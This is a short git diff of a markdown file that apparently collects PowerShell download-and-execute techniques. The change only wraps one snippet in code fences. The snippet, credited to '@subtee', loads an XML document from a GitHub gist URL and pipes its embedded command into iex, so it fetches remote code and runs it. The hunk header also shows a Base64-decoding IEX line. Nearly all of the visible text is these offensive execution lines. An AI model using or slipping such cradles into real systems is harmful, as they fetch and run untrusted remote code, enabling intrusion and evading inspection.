@@ -64,7 +64,7 @@ IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((
 
 
 ### from @subtee
-<#
+```<#
 <?xml version="1.0"?>
 <command>
    <a>
@@ -74,7 +74,7 @@ IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((
 #>
 $a = New-Object System.Xml.XmlDocument
 $a.Load("https://gist.githubusercontent.com/subTee/47f16d60efc9f7cfefd62fb7a712ec8d/raw/1ffde429dc4a05f7bc7ffff32017a3133634bc36/gistfile1.txt")
-$a.command.a.execute | iex
+$a.command.a.execute | iex```
 
 References:
 
